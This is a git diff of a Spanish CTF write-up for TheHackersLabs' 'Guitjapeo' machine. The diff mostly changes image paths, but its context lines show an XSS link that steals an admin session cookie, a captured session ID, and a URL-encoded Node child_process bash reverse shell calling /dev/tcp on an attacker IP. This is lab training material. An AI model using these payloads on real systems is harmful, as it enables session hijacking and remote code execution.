@@ -5,7 +5,7 @@ title: WriteUp Guitjapeo - TheHackersLabs
 slug: guitjapeo-writeup-thehackerslabs-es
 featured: false  
 draft: false  
-ogImage: "assets/guitjapeo/OpenGraph.png"  
+ogImage: "../../../assets/images/guitjapeo/OpenGraph.png"  
 tags:
   - writeup
   - TheHackersLabs
@@ -21,7 +21,7 @@ lang: es
 
 CTF donde tendremos que programar, aprender sobre git y crearnos una cuenta de GitHub. 
 
-![alt text](/assets/guitjapeo/image.png)
+![alt text](../../../assets/images/guitjapeo/image.png)
 
 Espero que sea de vuestro agrado.
 
@@ -92,7 +92,7 @@ ff02::2         ip6-allrouters
 192.168.1.173   guitjapeo.thl
 ```
 
-![guitjapeo.thl](/assets/guitjapeo/image-1.png)
+![guitjapeo.thl](../../../assets/images/guitjapeo/image-1.png)
 
 Escaneamos este sitio web.
 
@@ -135,11 +135,11 @@ Finished
 
 Entramos en `https://guitjapeo.thl/register` y creamos un usario.
 
-![alt text](/assets/guitjapeo/image-2.png)
+![alt text](../../../assets/images/guitjapeo/image-2.png)
 
 y validamos nuestro usuario en `https://guitjapeo.thl/login`. Conseguiremos entrar a `https://guitjapeo.thl/messages`.
 
-![alt text](/assets/guitjapeo/image-3.png)
+![alt text](../../../assets/images/guitjapeo/image-3.png)
 
 Vemos que hay una especie de api donde se envían los mensaje y se lee el listado de usuarios entre otras cosas, seguimos buscando con gobuster en la ruta de la api.
 
@@ -179,7 +179,7 @@ Finished
 
 Encontramos otros endpoints interesantes, visitamos el endpoint /api/info y nos devuelve un json con las cabeceras.
 
-![alt text](/assets/guitjapeo/image-4.png)
+![alt text](../../../assets/images/guitjapeo/image-4.png)
 
 ## Secuestro de cookies
 
@@ -187,11 +187,11 @@ En el formulario de mensajes podemos enviar una URL, parece que en el desplegabl
 
 Hacemos una primera comprobación enviando una URL con la ip de nuestra maquina y un servicio http con python.
 
-![alt text](/assets/guitjapeo/image-5.png)
+![alt text](../../../assets/images/guitjapeo/image-5.png)
 
 Parece que el usuario "Administrador" esta visitando todos los enlaces que se le envían por la aplicación. Si intentamos leer la cookie de sesión no podremos porque tiene configurado "HttpOnly" esto impide leer la cookie desde el navegador, solo es posible leerla desde el lado del servidor.
 
-![alt text](/assets/guitjapeo/image-6.png)
+![alt text](../../../assets/images/guitjapeo/image-6.png)
 
 Esto tiene solución si utilizamos el endpoint `/api/info` que nos permite leer las cabeceras, incluida la de las cookies.
 
@@ -272,7 +272,7 @@ https://guitjapeo.thl/?text=%3Cscript%20src%3D%22https%3A%2F%2Fcdn.jsdelivr.net%
 
 ... y esperamos que haga clic para recibir su cookie de sesión.
 
-![alt text](/assets/guitjapeo/image-8.png)
+![alt text](../../../assets/images/guitjapeo/image-8.png)
 
 Descodificamos el base64 y añadimos los datos de la sesión a nuestra sesión desde el navegador.
 
@@ -283,7 +283,7 @@ connect.sid=s%3A9a5Nk7U822jJ8sTvZ0md_17zMdYZRhSK.WtnvPx1dWLKLv4lOr6OES1e0wb4osW%
 ```
 Actualizamos la pagina después de modificar la cookie y ya somos el usuario Administrador.
 
-![alt text](/assets/guitjapeo/image-9.png)
+![alt text](../../../assets/images/guitjapeo/image-9.png)
 
 ## RCE
 
@@ -305,7 +305,7 @@ y lo añadimos a la URL como
 https://guitjapeo.thl/api/command/?cmd=require%28%27child_process%27%29.exec%28%27bash%20-c%20%22%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.116%2F12345%200%3E%261%22%27%29
 ```
 
-![alt text](/assets/guitjapeo/image-10.png)
+![alt text](../../../assets/images/guitjapeo/image-10.png)
 
 Obtenemos un shell con el usuario lenam.
 
@@ -346,7 +346,7 @@ Encontramos una carpeta .git, buscamos si hay algo en el historial del repositor
 git log --name-only --oneline
 ```
 
-![alt text](/assets/guitjapeo/image-11.png)
+![alt text](../../../assets/images/guitjapeo/image-11.png)
 
 Encontramos dos ficheros `archivo.zip` y `password.txt` que no están en la carpeta de la aplicación, los intentamos recuperar.
 
@@ -594,7 +594,7 @@ User lenam may run the following commands on guitjapeo:
 
 Vemos que podemos ejecutar el comando `git` (como no podía ser de otra forma) como el usuario root.
 
-![alt text](/assets/guitjapeo/image-12.png)
+![alt text](../../../assets/images/guitjapeo/image-12.png)
 
 En GTFOBins encontramos este binario donde nos muestra algunas formas de poder utilizarlo para elevar privilegios, algunas utilizan el manual o ayuda con `less` no funcionará porque no están instalados los manuales de git.
 
